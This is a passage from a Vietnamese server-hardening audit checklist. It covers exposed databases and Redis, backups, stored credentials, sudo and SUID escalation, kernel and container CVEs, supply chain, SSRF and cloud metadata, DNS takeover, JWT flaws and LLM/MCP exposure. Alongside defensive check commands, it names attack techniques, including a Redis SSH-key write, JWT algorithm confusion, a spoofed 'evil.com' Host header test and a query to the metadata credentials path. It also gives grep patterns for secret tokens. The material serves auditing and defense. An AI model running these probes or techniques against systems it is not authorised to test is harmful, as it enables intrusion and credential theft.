**Đạt chuẩn:** Chỉ TLS 1.2 + 1.3, cipher suite ECDHE, HSTS bật.

---

## TIER 4 — TẦNG DỮ LIỆU

### T4-01 — Database phơi ra ngoài

**Mức:** CRITICAL

**Lệnh check:**
```bash
# MySQL/MariaDB bind vào đâu
grep -rE '^bind-address|^skip-networking|^port' /etc/mysql/ /etc/my.cnf /etc/my.cnf.d/ 2>/dev/null
ss -tlnp | grep -E ':3306|:5432|:27017|:6379|:9200|:11211'

# Tài khoản MySQL cho phép kết nối từ mọi host
mysql -e "SELECT user, host, plugin FROM mysql.user;" 2>/dev/null

# User không có mật khẩu
mysql -e "SELECT user, host FROM mysql.user WHERE authentication_string='' AND plugin NOT IN ('auth_socket','unix_socket');" 2>/dev/null

# PostgreSQL
grep -vE '^\s*#|^\s*$' /etc/postgresql/*/main/pg_hba.conf 2>/dev/null
grep -E '^listen_addresses' /etc/postgresql/*/main/postgresql.conf 2>/dev/null
```

**Cờ đỏ:**
- `bind-address = 0.0.0.0` hoặc dòng `bind-address` bị comment
- User MySQL với host `%` — chấp nhận kết nối từ bất kỳ đâu
- User không mật khẩu
- `pg_hba.conf` có method `trust` cho non-local
- Database test/demo còn tồn tại

---

### T4-02 — Redis, Memcached, và các datastore không auth

**Cơ chế:** Redis mặc định **không có xác thực**. Nếu mở ra internet, attacker chạy được RCE trong vài giây: ghi SSH key qua `CONFIG SET dir`, hoặc nạp module độc. Đây là một trong những vector bị khai thác nhiều nhất trên VPS.

**Mức:** CRITICAL

**Lệnh check:**
```bash
grep -E '^(bind|requirepass|protected-mode|rename-command|port)' /etc/redis/redis.conf 2>/dev/null

# Thử kết nối không mật khẩu — nếu ra PONG là hỏng nặng
redis-cli ping 2>/dev/null
redis-cli info server 2>/dev/null | head -5

# Từ ngoài (chạy trên máy khác)
redis-cli -h <VPS_IP> ping

# Memcached
ss -tulnp | grep 11211
grep -E '^-l|^-U|^-p' /etc/memcached.conf 2>/dev/null

# MongoDB
grep -E 'bindIp|authorization' /etc/mongod.conf 2>/dev/null

# Elasticsearch
grep -E 'network.host|xpack.security.enabled' /etc/elasticsearch/elasticsearch.yml 2>/dev/null
```

**Cờ đỏ:**
- `redis-cli ping` từ ngoài trả về `PONG` → **CRITICAL, xử lý ngay**
- Không có `requirepass`
- `protected-mode no`
- `bind 0.0.0.0`
- Memcached lắng nghe UDP (`-U 11211` khác 0) → nguồn DDoS amplification hệ số 50000x
- MongoDB `authorization: disabled`
- Elasticsearch `xpack.security.enabled: false` và không bind localhost

**Kiểm tra dấu hiệu đã bị khai thác:**
```bash
redis-cli config get dir 2>/dev/null      # nếu trỏ tới /root/.ssh hoặc /var/spool/cron → đã bị khai thác
redis-cli config get dbfilename 2>/dev/null
redis-cli --scan --pattern '*' 2>/dev/null | head -20
```

---

### T4-03 — Backup: tồn tại, mã hoá, và khả năng phục hồi

**Cơ chế:** Backup là lớp phòng thủ cuối trước ransomware. Nhưng backup nằm cùng máy và cùng credential thì ransomware mã hoá luôn. Backup chưa từng test restore = không có backup.

**Mức:** HIGH

**Lệnh check:**
```bash
find / -maxdepth 4 \( -name '*.sql' -o -name '*.sql.gz' -o -name '*.tar.gz' -o -name '*.dump' \) \
  -size +1M -not -path '/proc/*' -ls 2>/dev/null | head -30

crontab -l 2>/dev/null | grep -iE 'backup|dump|rsync|borg|restic|duplicity'
ls -la /etc/cron.d/ 2>/dev/null

# Backup có nằm trong webroot không — tức là tải về được qua HTTP
find /var/www /home/*/public_html -name '*.sql*' -o -name '*.tar.gz' 2>/dev/null

# Backup tool đang dùng
which borg restic duplicity rclone rsnapshot 2>/dev/null
```

**Cờ đỏ:**
- Không tìm thấy cơ chế backup nào
- Backup chỉ nằm trên chính VPS đó
- Backup nằm trong webroot → tải về công khai
- Backup không mã hoá, chứa dữ liệu client
- Không có bản ghi nào về lần test restore gần nhất
- Credential backup lưu plaintext trong script

**Chuẩn 3-2-1:** 3 bản sao, 2 loại phương tiện, 1 bản off-site. Với ransomware, thêm yêu cầu: 1 bản **immutable** (object lock / WORM) mà credential trên VPS không xoá được.

---

### T4-04 — Credential nằm trong file và biến môi trường

**Mức:** HIGH

**Lệnh check:**
```bash
# Credential trong file config, script
grep -rEl '(password|passwd|pwd|secret|api[_-]?key|token|private[_-]?key)\s*[=:]' \
  /etc /opt /srv /var/www --include='*.conf' --include='*.yml' --include='*.yaml' \
  --include='*.env' --include='*.json' --include='*.sh' 2>/dev/null | head -30

# Biến môi trường của process đang chạy — credential lộ qua đây rất hay gặp
for p in /proc/[0-9]*; do
  tr '\0' '\n' < "$p/environ" 2>/dev/null | grep -iE 'passw|secret|token|api_key' >/dev/null \
    && echo "PID $(basename $p): $(cat $p/comm 2>/dev/null) có credential trong env"
done 2>/dev/null

# Private key không được bảo vệ
find / -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' -o -name '*.key' \
  -not -path '/proc/*' 2>/dev/null | while read f; do stat -c '%n %a %U' "$f"; done

# History chứa credential
grep -iE 'mysql -p|psql.*password|curl.*-u |export.*TOKEN|ssh-keygen.*-N ' \
  /root/.bash_history /home/*/.bash_history 2>/dev/null | head -20
```

**Cờ đỏ:**
- Private key quyền khác `600`
- Credential plaintext trong file quyền world-readable
- Password gõ thẳng trong `.bash_history`
- Cùng một password dùng cho nhiều service

---

## TIER 5 — LEO THANG ĐẶC QUYỀN VÀ CONTAINER

### T5-01 — Cấu hình sudo

**Cơ chế:** Sau khi vào máy với quyền user thấp (qua webshell chẳng hạn), bước tiếp theo là leo lên root. Sudo cấu hình lỏng là con đường ngắn nhất.

**Mức:** HIGH

**Lệnh check:**
```bash
cat /etc/sudoers 2>/dev/null | grep -vE '^\s*#|^\s*$'
ls -la /etc/sudoers.d/ && cat /etc/sudoers.d/* 2>/dev/null | grep -vE '^\s*#|^\s*$'
sudo -l 2>/dev/null
sudo --version | head -1
```

**Cờ đỏ:**
- `NOPASSWD: ALL` cho user thường
- `www-data` hoặc user service có bất kỳ quyền sudo nào → webshell = root ngay
- Cho phép sudo các binary có khả năng thoát shell: `vim`, `less`, `more`, `find`, `awk`, `nmap`, `python`, `perl`, `tar`, `zip`, `git`, `docker`, `systemctl` — tra cứu GTFOBins để biết binary nào escape được
- `env_keep` giữ `LD_PRELOAD` hoặc `LD_LIBRARY_PATH`
- Sudo version < 1.9.5p2 → CVE-2021-3156 (Baron Samedit), heap overflow, root không cần password

---

### T5-02 — SUID/SGID binary

**Cơ chế:** Binary SUID chạy với quyền chủ sở hữu (thường root) bất kể ai gọi. Một SUID binary sai = leo thang root.

**Mức:** HIGH

**Lệnh check:**
```bash
# Liệt kê toàn bộ SUID/SGID
find / -type f \( -perm -4000 -o -perm -2000 \) -not -path '/proc/*' -ls 2>/dev/null

# So với danh sách SUID chuẩn của distro — cái nào lạ thì đáng nghi
find / -perm -4000 -type f -not -path '/proc/*' 2>/dev/null | \
  grep -vE '/(su|sudo|mount|umount|passwd|chsh|chfn|gpasswd|newgrp|pkexec|ping|ping6|fusermount|ssh-agent|at|crontab|unix_chkpwd|dbus-daemon-launch-helper|polkit-agent-helper-1|snap-confine|vmware-user-suid-wrapper)$'

# File có capabilities — SUID "hiện đại", hay bị bỏ sót
getcap -r / 2>/dev/null

# File ai cũng ghi được
find / -xdev -type f -perm -0002 -not -path '/proc/*' -ls 2>/dev/null | head -30

# Thư mục ai cũng ghi được, không có sticky bit
find / -xdev -type d -perm -0002 ! -perm -1000 -not -path '/proc/*' -ls 2>/dev/null | head -20
```

**Cờ đỏ:**
- SUID trên `bash`, `python`, `perl`, `find`, `vim`, `nmap`, `cp`, `tar` → leo root tức thì, tra GTFOBins
- SUID nằm trong `/tmp`, `/home`, `/var/tmp`
- `cap_setuid` hoặc `cap_dac_override` trên binary bất kỳ
- `pkexec` version dính CVE-2021-4034 (PwnKit) — ảnh hưởng gần như mọi bản polkit trước 2022-01, exploit công khai, chạy 1 lệnh ra root

---

### T5-03 — Kernel và exploit leo thang cục bộ

**Mức:** HIGH

**Lệnh check:**
```bash
uname -a
cat /etc/os-release
# Kernel đã cài vs kernel đang chạy — nếu khác là chưa reboot sau update
dpkg -l | grep linux-image 2>/dev/null
rpm -qa kernel 2>/dev/null

# Các biện pháp cứng hoá kernel
sysctl -a 2>/dev/null | grep -E 'kernel.kptr_restrict|kernel.dmesg_restrict|kernel.unprivileged_bpf_disabled|kernel.yama.ptrace_scope|net.ipv4.conf.all.rp_filter|kernel.randomize_va_space|fs.protected_hardlinks|fs.protected_symlinks|user.max_user_namespaces|kernel.unprivileged_userns_clone'
```

**CVE leo thang cục bộ cần đối chiếu:**

| CVE | Tên | Ảnh hưởng | Ghi chú |
|---|---|---|---|
| CVE-2021-4034 | PwnKit | polkit `pkexec`, mọi bản trước 2022-01 | Exploit 1 dòng, cực dễ |
| CVE-2021-3156 | Baron Samedit | sudo < 1.9.5p2 | Heap overflow |
| CVE-2022-0847 | Dirty Pipe | kernel 5.8 – 5.16.11 | Ghi đè file read-only |
| CVE-2023-4911 | Looney Tunables | glibc ld.so 2.34+ | Buffer overflow trong `GLIBC_TUNABLES` |
| CVE-2024-1086 | nf_tables UAF | kernel 3.15 – 6.1.x | Exploit công khai, tin cậy cao |
| CVE-2022-2588 | route4 UAF | kernel < 5.19 | |
| CVE-2021-22555 | Netfilter heap OOB | kernel 2.6.19+ | |

**Cờ đỏ:**
- Kernel đang chạy khác kernel mới nhất đã cài → chưa reboot, bản vá chưa có hiệu lực
- `kernel.unprivileged_userns_clone = 1` → mở đường cho nhiều exploit kernel
- `kernel.yama.ptrace_scope = 0` → process đọc được bộ nhớ của nhau
- `kernel.kptr_restrict = 0` → lộ địa chỉ kernel, giúp bypass KASLR

---

### T5-04 — Docker và container escape

**Cơ chế:** Ba đường thoát container phổ biến: (1) quyền truy cập Docker socket, (2) container `--privileged`, (3) mount host filesystem vào container. Cả ba đều tương đương root trên host.

**Mức:** CRITICAL nếu có Docker

**Lệnh check:**
```bash
docker ps -a 2>/dev/null
docker --version 2>/dev/null

# Docker API mở ra mạng — nghiêm trọng nhất
ss -tlnp | grep -E ':2375|:2376'
grep -rE 'tcp://' /etc/docker/daemon.json /lib/systemd/system/docker.service \
  /etc/systemd/system/docker.service.d/* 2>/dev/null

# Container chạy privileged
docker ps -q 2>/dev/null | while read c; do
  echo "$(docker inspect -f '{{.Name}} privileged={{.HostConfig.Privileged}} pid={{.HostConfig.PidMode}} net={{.HostConfig.NetworkMode}}' $c 2>/dev/null)"
done

# Container mount docker.sock hoặc host root
docker ps -q 2>/dev/null | while read c; do
  docker inspect -f '{{.Name}}: {{range .Mounts}}{{.Source}}→{{.Destination}} {{end}}' $c 2>/dev/null
done | grep -E 'docker.sock|: / |/etc|/root'

# Container chạy user root
docker ps -q 2>/dev/null | while read c; do
  docker inspect -f '{{.Name}} user=[{{.Config.User}}]' $c 2>/dev/null
done

# Ai thuộc nhóm docker — nhóm docker = root, không có ngoại lệ
getent group docker

# Quyền socket
stat -c '%n %a %U:%G' /var/run/docker.sock 2>/dev/null

# Capability thừa
docker ps -q 2>/dev/null | while read c; do
  docker inspect -f '{{.Name}} capadd={{.HostConfig.CapAdd}}' $c 2>/dev/null
done
```

**Cờ đỏ:**
- Port 2375 mở (Docker API không TLS) → **RCE root trên host, không cần xác thực**
- `Privileged=true`
- Mount `/var/run/docker.sock` vào container
- Mount `/` hoặc `/etc` hoặc `/root` của host vào container
- User thường trong nhóm `docker`
- `CapAdd` chứa `SYS_ADMIN`, `SYS_PTRACE`, `SYS_MODULE`, `DAC_READ_SEARCH`
- runc < 1.1.12 → CVE-2024-21626 (Leaky Vessels), container escape qua file descriptor rò rỉ
- Image không pin digest, kéo tag `:latest` từ registry public

---

### T5-05 — Tách biệt tiến trình và kiểm soát truy cập bắt buộc

**Mức:** MEDIUM

**Lệnh check:**
```bash
# SELinux
sestatus 2>/dev/null
getenforce 2>/dev/null

# AppArmor
aa-status 2>/dev/null | head -10

# Service chạy bằng user nào — service nào cũng chạy root là sai
ps -eo user,comm --no-headers | sort -u | head -40

# systemd hardening cho từng unit
systemctl show nginx mysql php*-fpm redis 2>/dev/null | \
  grep -E 'PrivateTmp|ProtectSystem|ProtectHome|NoNewPrivileges|User=' | head -30
```

**Cờ đỏ:**
- `getenforce` trả `Disabled` hoặc `Permissive`
- AppArmor không load profile nào
- Web server, database chạy với user `root`
- systemd unit không có `NoNewPrivileges=yes`, `ProtectSystem=strict`, `PrivateTmp=yes`

---

## TIER 6 — SUPPLY CHAIN VÀ CI/CD

> Đây là tier bị bỏ qua nhiều nhất, và là hướng tấn công tăng trưởng nhanh nhất giai đoạn 2024–2026.

### T6-01 — Dependency ứng dụng

**Cơ chế:** Attacker không đánh vào server mà đánh vào package mà server cài. Typosquatting, chiếm tài khoản maintainer, chèn script `postinstall` độc hại. Một `npm install` đủ để lộ toàn bộ biến môi trường.

**Mức:** HIGH

**Lệnh check:**
```bash
# Node
cd /var/www/<app> && npm audit --production 2>/dev/null
npm ls --depth=0 2>/dev/null

# PHP
composer audit 2>/dev/null
composer outdated --direct 2>/dev/null

# Python
pip list --outdated 2>/dev/null
pip-audit 2>/dev/null

# Package có script postinstall — vector chèn mã phổ biến nhất
grep -rl '"postinstall"\|"preinstall"\|"install"' /var/www/*/node_modules/*/package.json 2>/dev/null | head -20

# Lockfile có được commit không — không có lockfile = version trôi nổi
ls -la /var/www/*/package-lock.json /var/www/*/composer.lock /var/www/*/yarn.lock \
   /var/www/*/poetry.lock /var/www/*/requirements.txt 2>/dev/null
```

**Cờ đỏ:**
- CVE mức CRITICAL/HIGH trong `npm audit` / `composer audit`
- Không có lockfile
- Package cài từ URL git trực tiếp thay vì registry
- Package `postinstall` gọi mạng
- Dependency đã archived/deprecated nhưng vẫn dùng

**Sự cố tham chiếu:** Chuỗi tấn công npm worm dạng tự lan (Shai-Hulud, 09/2025) đánh cắp token CI/CD rồi tự publish package nhiễm — cho thấy một lần `npm install` trên máy có token là đủ để lan cả tổ chức. Kiểm tra xem VPS có lưu npm token, GitHub token không.

---

### T6-02 — CI/CD và secret trên server

**Cơ chế:** VPS thường có deploy key, CI runner, hoặc token để pull code. Chiếm được VPS = chiếm được repo = chèn mã vào bản build kế tiếp.

**Mức:** HIGH

**Lệnh check:**
```bash
# Token/secret trong file cấu hình
grep -rEl 'ghp_|github_pat_|gho_|glpat-|xox[baprs]-|AKIA[0-9A-Z]{16}|sk-[A-Za-z0-9]{20,}|AIza[0-9A-Za-z_-]{35}' \
  /root /home /var/www /opt /etc 2>/dev/null | head -20

# CI runner đang chạy trên VPS
ps aux | grep -iE 'gitlab-runner|github-runner|jenkins|drone|buildkite' | grep -v grep
ls -la /etc/gitlab-runner/ /home/*/actions-runner/ 2>/dev/null

# Deploy key
cat /root/.ssh/config /home/*/.ssh/config 2>/dev/null
ls -la /root/.ssh/ 2>/dev/null

# Git remote — kiểm tra credential nhúng trong URL
find /var/www /opt -name '.git' -maxdepth 3 -type d 2>/dev/null | while read g; do
  echo "=== $g ==="; git --git-dir="$g" remote -v 2>/dev/null
done

# Webhook endpoint deploy tự động
grep -rE 'webhook|deploy\.php|git pull' /etc/nginx/ /var/www --include='*.conf' --include='*.php' 2>/dev/null | head -20
```

**Cờ đỏ:**
- Token API hardcode trong file
- Credential nhúng trong git remote URL (`https://user:token@github.com/...`)
- Webhook deploy không xác thực chữ ký
- CI runner chạy quyền root
- Deploy key có quyền ghi (chỉ cần read-only)

---

### T6-03 — Nguồn package hệ thống

**Mức:** MEDIUM

**Lệnh check:**
```bash
cat /etc/apt/sources.list 2>/dev/null
ls -la /etc/apt/sources.list.d/ 2>/dev/null && cat /etc/apt/sources.list.d/* 2>/dev/null
apt-key list 2>/dev/null | head -30
ls -la /etc/apt/trusted.gpg.d/ 2>/dev/null

# RHEL
ls -la /etc/yum.repos.d/ 2>/dev/null && grep -E 'baseurl|gpgcheck|enabled' /etc/yum.repos.d/* 2>/dev/null
```

**Cờ đỏ:**
- Repo bên thứ ba không rõ nguồn gốc
- Repo dùng `http://` thay vì `https://`
- `gpgcheck=0`
- GPG key đã hết hạn hoặc không nhận diện được

**Sự cố tham chiếu:** Backdoor XZ Utils (CVE-2024-3094, phiên bản 5.6.0/5.6.1, tháng 3/2024) được cài vào chính upstream tarball qua một maintainer được cấy trong ~2 năm — nó cho phép bypass xác thực SSH. Kiểm tra `xz --version`; nếu là 5.6.0 hoặc 5.6.1 thì phải hạ cấp ngay.

---

## TIER 7 — TẤN CÔNG NÂNG CAO VÀ CVE GIAI ĐOẠN 2024–2026

### T7-01 — CVE hạ tầng trọng yếu cần đối chiếu

**Mức:** CRITICAL

**Lệnh check:**
```bash
# OpenSSH — regreSSHion CVE-2024-6387 (RCE quyền root, không cần xác thực)
ssh -V 2>&1
# Dính nếu: OpenSSH 8.5p1 → 9.7p1 trên glibc, và bản < 4.4p1

# XZ Utils backdoor CVE-2024-3094
xz --version 2>&1
dpkg -l | grep -E 'xz-utils|liblzma' 2>/dev/null
# Dính nếu: 5.6.0 hoặc 5.6.1

# Terrapin CVE-2023-48795 — hạ cấp kênh SSH
ssh -V 2>&1   # cần >= 9.6
sshd -T 2>/dev/null | grep -iE 'ciphers|macs' | grep -E 'chacha20|-etm@'

# glibc
ldd --version | head -1

# sudo
sudo --version | head -1

# polkit / PwnKit CVE-2021-4034
pkexec --version 2>/dev/null
dpkg -l | grep policykit 2>/dev/null

# runc — Leaky Vessels CVE-2024-21626
runc --version 2>/dev/null

# CUPS CVE-2024-47176 — cups-browsed lắng nghe UDP 631, RCE
ss -ulnp | grep 631
systemctl is-active cups-browsed 2>/dev/null
```

**Bảng đối chiếu:**

| CVE | Thành phần | Bản dính | Tác động |
|---|---|---|---|
| CVE-2024-6387 | OpenSSH | 8.5p1–9.7p1 (glibc) | RCE root, không cần auth |
| CVE-2024-3094 | XZ Utils | 5.6.0, 5.6.1 | Backdoor bypass auth SSH |
| CVE-2023-48795 | SSH (Terrapin) | < OpenSSH 9.6 | Hạ cấp kênh bảo mật |
| CVE-2021-4034 | polkit pkexec | trước 2022-01 | Leo thang root cục bộ |
| CVE-2021-3156 | sudo | < 1.9.5p2 | Leo thang root cục bộ |
| CVE-2023-4911 | glibc | ld.so 2.34+ | Leo thang root cục bộ |
| CVE-2024-1086 | kernel nf_tables | 3.15–6.1.x | Leo thang root cục bộ |
| CVE-2024-21626 | runc | < 1.1.12 | Container escape |
| CVE-2024-47176 | cups-browsed | < 2.0.1 | RCE qua UDP 631 |
| CVE-2023-44487 | HTTP/2 | mọi impl trước bản vá | Rapid Reset DDoS |
| CVE-2021-44228 | Log4j | 2.0–2.14.1 | RCE (nếu có Java) |
| CVE-2025-32433 | Erlang/OTP SSH | < 25.3.2.10 / 26.2.4 / 27.3.3 | RCE không cần auth (nếu có RabbitMQ/Elixir) |
| CVE-2025-29927 | Next.js middleware | 11.1.4–15.2.2 | Bypass xác thực middleware |

> **Lưu ý về thời điểm:** Bảng này dừng ở dữ liệu tao nắm được. Với CVE công bố sau đó, phải đối chiếu trực tiếp tại `https://ubuntu.com/security/cves` (hoặc trang tương ứng của distro), `https://nvd.nist.gov/`, và CISA KEV catalog `https://www.cisa.gov/known-exploited-vulnerabilities-catalog`. **Đừng tin bảng tĩnh cho việc audit thực tế** — luôn chạy `apt list --upgradable | grep security` để lấy trạng thái thật của máy.

---

### T7-02 — Tấn công tầng HTTP hiện đại

**Mức:** MEDIUM–HIGH

| Loại | Cơ chế | Cách kiểm tra |
|---|---|---|
| **HTTP Request Smuggling** | Reverse proxy và backend diễn giải `Content-Length` vs `Transfer-Encoding` khác nhau → chèn request vào phiên người khác | Test khi có nhiều lớp proxy (CDN → nginx → app). Dùng Burp HTTP Request Smuggler |
| **Web Cache Poisoning** | Header không thuộc cache key (`X-Forwarded-Host`) ảnh hưởng response được cache → phát tán payload cho mọi người dùng | Rà `proxy_cache_key` trong nginx; đảm bảo không phản chiếu header vào response |
| **Web Cache Deception** | `/account.php/nonexistent.css` → proxy cache trang riêng tư thành file tĩnh | Kiểm tra quy tắc cache theo extension |
| **HTTP/2 Rapid Reset** | Mở/huỷ stream liên tục → cạn tài nguyên server (CVE-2023-44487) | Vá nginx/apache, đặt `http2_max_concurrent_streams` |
| **Host Header Injection** | App tin `Host` header → password reset link trỏ về domain attacker | Cấu hình `server_name` chặt, có `default_server` trả 444 |
| **CRLF Injection** | Chèn `\r\n` vào header → tách response | Kiểm tra nơi header lấy giá trị từ input |

**Lệnh check:**
```bash
# Server có chấp nhận Host header tuỳ ý không
curl -sI -H 'Host: evil.com' http://<VPS_IP>/ | head -5

# Có default_server trả về lỗi cho Host lạ không
grep -rE 'default_server|server_name\s+_' /etc/nginx/ 2>/dev/null

# Cache key
grep -rE 'proxy_cache_key|fastcgi_cache_key' /etc/nginx/ 2>/dev/null

# HTTP/2 giới hạn stream
grep -rE 'http2_max_concurrent_streams|http2' /etc/nginx/ 2>/dev/null
```

---

### T7-03 — SSRF và cloud metadata

**Cơ chế:** Nếu app fetch URL do người dùng nhập (import ảnh, webhook, preview link), attacker trỏ nó vào `169.254.169.254` để lấy credential IAM của instance. Trên cloud, đây là đường từ "lỗi web nhỏ" đến "chiếm toàn bộ tài khoản cloud".

**Mức:** CRITICAL trên cloud, MEDIUM trên VPS truyền thống

**Lệnh check:**
```bash
# Endpoint metadata có truy cập được từ máy không
curl -s --max-time 3 http://169.254.169.254/latest/meta-data/ 2>&1 | head -5    # AWS
curl -s --max-time 3 -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/ 2>&1 | head -5  # GCP
curl -s --max-time 3 -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' 2>&1 | head -5  # Azure
curl -s --max-time 3 http://169.254.169.254/metadata/v1/ 2>&1 | head -5         # DigitalOcean

# AWS: IMDSv1 còn bật không (v1 dính SSRF, v2 yêu cầu token PUT nên miễn nhiễm)
curl -s --max-time 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>&1

# App có chặn dải IP nội bộ khi fetch URL không
grep -rE '169\.254|metadata|127\.0\.0\.1|localhost' /var/www --include='*.php' --include='*.js' 2>/dev/null | grep -iE 'block|deny|filter' | head
```

**Cờ đỏ:**
- Metadata endpoint trả dữ liệu và IMDSv1 còn bật
- App có chức năng fetch URL mà không whitelist domain
- Không chặn dải `169.254.0.0/16`, `127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16` ở tầng app

**Khắc phục:** Bắt buộc IMDSv2 (`HttpTokens: required`), whitelist domain đích thay vì blacklist, chặn redirect khi fetch.

---

### T7-04 — DNS và chiếm quyền tên miền

**Mức:** HIGH

**Lệnh check (chạy từ máy ngoài):**
```bash
dig <domain> ANY +noall +answer
dig <domain> NS +short
dig <domain> CAA +short
dig _dmarc.<domain> TXT +short
dig <domain> TXT +short | grep -i spf
dig default._domainkey.<domain> TXT +short

# Liệt kê subdomain, tìm bản ghi trỏ tới dịch vụ đã huỷ → subdomain takeover
dig +short <sub>.<domain> CNAME

# DNSSEC
dig <domain> DNSKEY +short
```

**Cờ đỏ:**
- **Subdomain takeover:** CNAME trỏ tới S3 bucket/Heroku/GitHub Pages/Azure đã xoá → ai cũng đăng ký lại được và chiếm subdomain đó, dùng để phishing dưới tên miền của mày
- Không có bản ghi CAA → bất kỳ CA nào cũng cấp được cert cho domain
- Không có SPF, DKIM, DMARC → domain bị giả mạo gửi mail
- DMARC ở `p=none` — chỉ giám sát, không chặn
- Không bật DNSSEC
- Registrar không bật registrar lock / 2FA

---

### T7-05 — Lỗ hổng xác thực và session

**Mức:** HIGH

| Loại | Cơ chế | Kiểm tra |
|---|---|---|
| **JWT `alg: none`** | Server chấp nhận token không chữ ký | Thử đổi header thành `{"alg":"none"}`, bỏ signature |
| **JWT confusion RS256→HS256** | Server dùng public key làm HMAC secret | Ký lại token bằng public key với HS256 |
| **Session fixation** | Session ID không đổi sau khi login | So sánh cookie trước/sau login |
| **Cookie không cờ bảo vệ** | Thiếu `HttpOnly`, `Secure`, `SameSite` | `curl -sI` xem `Set-Cookie` |
| **OAuth redirect_uri lỏng** | Wildcard trong redirect → đánh cắp authorization code | Rà cấu hình OAuth provider |
| **Password reset token yếu** | Token đoán được hoặc không hết hạn | Rà logic sinh token |

**Lệnh check:**
```bash
curl -sI https://<domain>/login | grep -i 'set-cookie'
grep -rE 'session.cookie_httponly|session.cookie_secure|session.cookie_samesite|session.use_strict_mode' \
  /etc/php/*/fpm/php.ini 2>/dev/null
```

**Đạt chuẩn PHP:** `session.cookie_httponly=1`, `session.cookie_secure=1`, `session.cookie_samesite=Strict|Lax`, `session.use_strict_mode=1`.

---

### T7-06 — Bề mặt tấn công AI/LLM (mới, 2025–2026)

**Cơ chế:** Nếu VPS chạy MCP server, AI agent, hoặc tích hợp LLM có quyền gọi tool, thì prompt injection trở thành vector RCE gián tiếp: nội dung độc hại trong dữ liệu mà agent đọc (email, trang web, file) có thể điều khiển agent thực hiện hành động. Đây là bề mặt tấn công mà hầu hết checklist bảo mật truyền thống chưa cover.

**Mức:** HIGH nếu có chạy agent/MCP có quyền ghi

**Lệnh check:**
```bash
# MCP server đang chạy
ps aux | grep -iE 'mcp|model-context|langchain|llama|ollama|vllm' | grep -v grep
ss -tlnp | grep -E ':11434|:8080|:3000|:5000|:8000'

# Ollama phơi ra ngoài — không có auth mặc định
curl -s --max-time 3 http://127.0.0.1:11434/api/tags 2>/dev/null | head -3

# API key LLM trên máy
grep -rEl 'sk-ant-|sk-proj-|sk-[A-Za-z0-9]{32,}|OPENAI_API_KEY|ANTHROPIC_API_KEY' \
  /root /home /opt /var/www /etc 2>/dev/null | head

# Config MCP
find / -name '*mcp*.json' -o -name 'claude_desktop_config.json' -not -path '/proc/*' 2>/dev/null | head
```

**Cờ đỏ:**
- Ollama/vLLM/LM Studio bind `0.0.0.0` → ai cũng gọi được, đốt tài nguyên và có thể trích xuất model
- MCP server có quyền ghi filesystem hoặc chạy shell, kết nối tới nguồn dữ liệu không tin cậy
- API key LLM lưu plaintext — key bị lộ có thể tốn hàng nghìn USD trong vài giờ
- Agent tự động xử lý nội dung từ internet mà không có sandbox

---

### T7-07 — Side-channel và tấn công tầng hạ tầng

**Mức:** LOW–MEDIUM (hiếm với VPS thương mại thông thường, nhưng cần biết)

```bash
# Trạng thái giảm thiểu lỗ hổng CPU (Spectre/Meltdown/Retbleed/Downfall/Inception)
grep -r . /sys/devices/system/cpu/vulnerabilities/ 2>/dev/null

# Microcode
dmesg 2>/dev/null | grep -i microcode | head -5
```

**Cờ đỏ:** Bất kỳ mục nào ghi `Vulnerable`. Trên VPS chia sẻ, điều này về lý thuyết cho phép tenant khác đọc bộ nhớ. Không tự vá được — phải yêu cầu nhà cung cấp.

---

## TIER 9 — GIÁM SÁT, GHI LOG VÀ KHẢ NĂNG PHỤC HỒI

### T9-01 — Ghi log và lưu trữ log

**Mức:** HIGH

**Cơ chế:** Không có log = không điều tra được sau sự cố, và không phát hiện được tấn công đang diễn ra. Log nằm cùng máy bị hack = attacker xoá được.

**Lệnh check:**
```bash
systemctl is-active rsyslog systemd-journald 2>/dev/null
journalctl --disk-usage 2>/dev/null
cat /etc/logrotate.conf 2>/dev/null | grep -E 'rotate|weekly|monthly|daily'

# Log có được gửi ra ngoài không
grep -rE '@@|@[0-9]|target=' /etc/rsyslog.conf /etc/rsyslog.d/ 2>/dev/null

# auditd — ghi lại system call, cần cho forensic
systemctl is-active auditd 2>/dev/null
auditctl -l 2>/dev/null | head -20
```

**Cờ đỏ:**
- Không có log tập trung (remote syslog / Loki / ELK)
- Log giữ < 90 ngày — thời gian trung bình phát hiện xâm nhập thường dài hơn mức này
- `auditd` không chạy

---

### T9-02 — Giám sát toàn vẹn file (FIM)

**Mức:** MEDIUM

```bash
which aide tripwire ossec-control wazuh-agent samhain 2>/dev/null
ls -la /var/lib/aide/ 2>/dev/null
systemctl is-active wazuh-agent ossec 2>/dev/null
```

**Cờ đỏ:** Không có FIM → webshell mới thả vào `/var/www` sẽ không ai biết cho tới khi hậu quả xảy ra.

---

### T9-03 — Cảnh báo và thời gian phản ứng

**Mức:** MEDIUM

**Câu hỏi phải trả lời được, không phải lệnh:**

- Ai nhận cảnh báo khi CPU 100% lúc 3h sáng?
- Có cảnh báo khi có `Accepted password` từ IP lạ không?
- Có cảnh báo khi file trong webroot thay đổi không?
- Thời gian phát hiện mục tiêu (MTTD) là bao lâu? Thời gian phản ứng (MTTR)?
- Có runbook cho tình huống "VPS bị hack" không? Ai quyết định ngắt kết nối server?
- Nếu phải rebuild toàn bộ VPS ngay bây giờ, mất bao lâu để khôi phục dịch vụ? Đã từng diễn tập chưa?

---

### T9-04 — Cập nhật tự động

**Mức:** HIGH

```bash
systemctl is-active unattended-upgrades 2>/dev/null
cat /etc/apt/apt.conf.d/50unattended-upgrades 2>/dev/null | grep -vE '^\s*//|^\s*$' | head -20
cat /etc/apt/apt.conf.d/20auto-upgrades 2>/dev/null

# RHEL
systemctl is-active dnf-automatic.timer yum-cron 2>/dev/null

# Livepatch kernel — vá không cần reboot
canonical-livepatch status 2>/dev/null
```

**Cờ đỏ:** Không có cơ chế tự động vá bảo mật. Với VPS không có đội trực 24/7, `unattended-upgrades` bật cho security repo là bắt buộc.

---

## 10. BẢNG CHẤM ĐIỂM

Chấm từng tier theo thang: **PASS** / **WARN** / **FAIL** / **N/A**

| Tier | Nội dung | Trọng số | Kết quả |
|---|---|---|---|
| T8 | Dấu hiệu xâm nhập | ×3 | |
| T2 | SSH và xác thực | ×3 | |
| T1 | Bề mặt mạng | ×3 | |
| T4 | Tầng dữ liệu | ×3 | |
| T3 | Ứng dụng web | ×2 | |
